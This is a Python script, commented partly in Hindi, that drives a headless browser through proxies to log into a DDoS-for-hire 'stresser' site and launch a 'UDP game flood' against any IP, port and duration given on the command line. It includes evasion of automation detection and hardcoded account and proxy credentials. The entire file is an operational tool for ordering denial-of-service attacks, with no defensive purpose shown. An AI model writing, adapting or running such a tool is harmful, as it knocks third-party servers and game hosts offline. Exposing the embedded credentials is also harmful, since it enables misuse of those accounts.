import sys
import random
import time
import os
from playwright.sync_api import sync_playwright

# ========== CONFIGURATION ==========
USERNAME = "Safe80"
PASSWORD = "React@1000"
PACKET_SIZE = "1400"
METHOD = "UDP game flood"
CONCURRENTS = "1"

LOGIN_URL = "https://etherstress.su/login"

# PROXIES - अगर काम न करें तो इन्हें हटा दो
PROXY_LIST = [
    "142.111.48.253:7030:jqjybxga:0x9qfg197gez",
    "23.95.150.145:6114:jqjybxga:0x9qfg197gez",
    # अगर सब fail हो रहे हैं तो PROXY_LIST = [] कर दो
]

def random_delay(min_sec=0.5, max_sec=2.0):
    time.sleep(random.uniform(min_sec, max_sec))

def get_random_proxy():
    if not PROXY_LIST:
        return None
    proxy_str = random.choice(PROXY_LIST)
    ip, port, user, pwd = proxy_str.split(":")
    print(f"[+] Using proxy: {ip}:{port}")
    return {"server": f"http://{ip}:{port}", "username": user, "password": pwd}

def get_random_user_agent():
    return random.choice([
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    ])

if len(sys.argv) < 4:
    print("Usage: python script.py <TARGET_IP> <TARGET_PORT> <DURATION>")
    sys.exit(1)

TARGET_IP = sys.argv[1]
TARGET_PORT = sys.argv[2]
DURATION = sys.argv[3]

print(f"[*] Target: {TARGET_IP}:{TARGET_PORT} for {DURATION}s")

try:
    proxy_config = get_random_proxy()
    
    with sync_playwright() as p:
        # VPS के लिए HEADLESS = TRUE
        browser = p.chromium.launch(
            headless=True,  # ✅ VPS के लिए HEADLESS MODE ON
            args=[
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-dev-shm-usage',
                '--disable-gpu',
                '--disable-blink-features=AutomationControlled'
            ]
        )
        
        context = browser.new_context(
            viewport={"width": 1366, "height": 768},
            user_agent=get_random_user_agent()
        )
        page = context.new_page()
        
        # ---------- LOGIN ----------
        print("[*] Logging in...")
        page.goto(LOGIN_URL, timeout=60000)
        random_delay(2, 3)
        
        # Take screenshot for debugging
        page.screenshot(path="debug_login.png")
        
        # Fill username
        page.fill('input[type="text"]', USERNAME)
        print("[+] Username filled")
        
        # Fill password
        page.fill('input[type="password"]', PASSWORD)
        print("[+] Password filled")
        
        random_delay(1, 2)
        
        # Click login
        page.click('button:has-text("Sign in")')
        print("[+] Login clicked")
        
        random_delay(4, 6)
        
        # ---------- CLICK PANEL ----------
        print("[*] Clicking Panel...")
        page.click('a:has-text("Panel")')
        random_delay(2, 3)
        
        # Wait for attack form
        page.wait_for_selector("input[placeholder='Target']", timeout=30000)
        
        # ---------- FILL ATTACK PARAMETERS ----------
        print("[*] Filling attack parameters...")
        
        page.fill("input[placeholder='Target']", TARGET_IP)
        page.fill("input[placeholder='Port']", TARGET_PORT)
        page.fill("input[placeholder='Size']", PACKET_SIZE)
        page.fill("input[placeholder='Time']", DURATION)
        random_delay(0.3, 0.7)
        
        # Method selection
        try:
            page.select_option("select", label=METHOD)
        except:
            page.select_option("select", value="UDP game flood")
        print(f"[+] Method: {METHOD}")
        
        # ---------- START ATTACK ----------
        print(f"[+] Launching attack on {TARGET_IP}:{TARGET_PORT}...")
        page.click("button:has-text('Start Attack')")
        print("[✓] Attack command sent!")
        
        # Wait for attack to complete
        time.sleep(int(DURATION) + 5)
        
        browser.close()
        
except Exception as e:
    print(f"[!] ERROR: {e}")